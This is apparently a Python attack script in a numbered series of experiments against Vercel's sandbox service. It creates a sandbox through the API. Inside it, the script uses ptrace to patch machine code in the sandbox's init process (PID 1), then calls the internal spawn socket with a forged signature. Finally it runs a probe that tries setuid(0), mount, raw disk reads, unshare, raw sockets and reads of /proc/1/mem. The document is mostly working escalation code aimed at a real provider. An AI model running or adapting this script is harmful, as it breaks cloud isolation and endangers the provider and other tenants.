# 实验J67: spawn 进程权限对比 (seccomp/setuid/mount/mknod) vs 普通 cmd 进程
# 关键: sandbox-init 有全套 caps (CapEff=000001ffffffffff), spawn 进程继承?
# 如果 spawn 无 seccomp + 全套 caps -> setuid(0) 提权测试
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj67"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

SCAN = r'''
import os, re, struct, subprocess, json, time, ctypes, base64

b = open("/run/vercel/share/sandbox-init", "rb").read()

print("===== [1] patch 失败分支 =====", flush=True)
libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.ptrace.argtypes = [ctypes.c_ulong, ctypes.c_ulong, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_long
libc.waitpid.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_int]
libc.waitpid.restype = ctypes.c_int

def ptrace_rw(addr, data=None, read_len=0):
    libc.ptrace(16, 1, None, None)
    wp = libc.waitpid(1, None, 0)
    if wp != 1:
        libc.ptrace(17, 1, None, None)
        return -1, "waitpid=%d" % wp
    if data is not None:
        PTRACE_POKEDATA = 5
        ok = 0
        total = (len(data) + 7) // 8
        for off in range(0, len(data), 8):
            word = int.from_bytes(data[off:off+8].ljust(8, b"\x00"), "little")
            r = libc.ptrace(PTRACE_POKEDATA, 1, addr + off, word)
            if r == 0:
                ok += 1
        libc.ptrace(17, 1, None, None)
        return ok, total
    else:
        PTRACE_PEEKDATA = 4
        out = b""
        off = 0
        while off < read_len:
            v = libc.ptrace(PTRACE_PEEKDATA, 1, addr + off, None)
            if v == -1:
                break
            out += (v & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
            off += 8
        libc.ptrace(17, 1, None, None)
        return len(out), out

PATCH_A = bytes.fromhex("31c031db4881c4d00000005dc3")
for va in [0x83b571, 0x83b5af]:
    ok, total = ptrace_rw(va, data=PATCH_A)
    print("PATCH A @ %s: %d/%d" % (hex(va), ok, total), flush=True)
PATCH_B = bytes.fromhex("31c031db4881c4900000005dc3")
ok, total = ptrace_rw(0x82a9f9, data=PATCH_B)
print("PATCH B: %d/%d" % (ok, total), flush=True)

def spawn_json(req_obj, timeout=20):
    body = json.dumps(req_obj).encode()
    env_body = b"\x00" + struct.pack(">I", len(body)) + body
    cmd = ["curl", "-sS", "--max-time", str(timeout), "-i", "-X", "POST",
           "--unix-socket", "/run/vercel/share/init.sock",
           "-H", "Content-Type: application/connect+json",
           "-H", "Connect-Protocol-Version: 1",
           "-H", "x-timestamp: " + str(int(time.time() * 1000)),
           "-H", "x-signature: " + base64.b64encode(b"\x99" * 64).decode(),
           "--data-binary", "@-", "http://localhost/vercel.sandbox.spawn.v1.SpawnService/Spawn"]
    try:
        r = subprocess.run(cmd, input=env_body, capture_output=True, timeout=timeout+2)
        out = r.stdout
    except Exception as e:
        return "EXC " + str(e)
    idx = out.find(b"\r\n\r\n")
    data = out[idx+4:] if idx >= 0 else out
    events = []
    i = 0
    while i + 5 <= len(data):
        ln = struct.unpack(">I", data[i+1:i+5])[0]
        if i + 5 + ln > len(data):
            break
        payload = data[i+5:i+5+ln]
        try:
            events.append(json.loads(payload))
        except Exception:
            events.append(payload)
        i += 5 + ln
    return events

def b64d(d):
    try:
        return base64.b64decode(d).decode("utf-8", "replace")
    except Exception:
        return d

def dump_events(ev, tag):
    print("--- %s ---" % tag, flush=True)
    for e in ev:
        if isinstance(e, dict) and "stdout" in e:
            print(b64d(e["stdout"]), end="", flush=True)
        elif isinstance(e, dict) and "stderr" in e:
            sys.stderr.write(b64d(e["stderr"]))
            sys.stderr.flush()
        elif isinstance(e, dict) and "exit" in e:
            print("[exit %s]" % json.dumps(e["exit"]), flush=True)
        else:
            print("EV: %r" % (e,), flush=True)

print("===== [2] spawn 进程权限探针 =====", flush=True)
PROBE = r"""
import os, sys
# 自身上下文
print("== spawn-proc status ==")
for line in open("/proc/self/status"):
    if line.startswith(("Uid", "Gid", "Cap", "Seccomp", "NoNewPrivs")):
        print(line.rstrip())
# setuid(0) 尝试
try:
    os.setuid(0)
    print("SETUID0: OK ->", os.getuid())
except Exception as e:
    print("SETUID0: FAIL %r" % e)
try:
    os.setgid(0)
    print("SETGID0: OK ->", os.getgid())
except Exception as e:
    print("SETGID0: FAIL %r" % e)
# mount 尝试
try:
    os.mkdir("/tmp/mt")
    os.system("mount -t tmpfs none /tmp/mt 2>&1 | head -2")
    print("MOUNT out:", open("/tmp/mt").__class__)
except Exception as e:
    print("MOUNT: FAIL %r" % e)
# /dev/vda 可读?
try:
    f = open("/dev/vda", "rb")
    f.seek(0)
    print("VDA first bytes:", f.read(16).hex())
    f.close()
except Exception as e:
    print("VDA: FAIL %r" % e)
# 内核模块加载尝试 (insmod 需要 CAP_SYS_MODULE)
try:
    r = os.system("modprobe -l 2>&1 | head -2; echo rc=$?")
    print("modprobe rc:", r)
except Exception as e:
    print("MODPROBE: FAIL %r" % e)
# unshare 尝试
try:
    os.unshare(os.CLONE_NEWNS)
    print("UNSHARE: OK")
except Exception as e:
    print("UNSHARE: FAIL %r" % e)
# bpf? raw socket?
try:
    import socket
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
    print("RAWSOCK: OK")
    s.close()
except Exception as e:
    print("RAWSOCK: FAIL %r" % e)
# /proc/1/mem 从 spawn 进程?
try:
    with open("/proc/1/mem", "rb", 0) as m:
        m.seek(0x400000)
        print("P1MEM: OK", m.read(4).hex())
except Exception as e:
    print("P1MEM: FAIL %r" % e)
"""
ev = spawn_json({"command": "python3", "arguments": ["-c", PROBE]})
dump_events(ev, "spawn 权限探针")
'''
run_cmd(sid, SCAN, "spawn-priv-probe", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
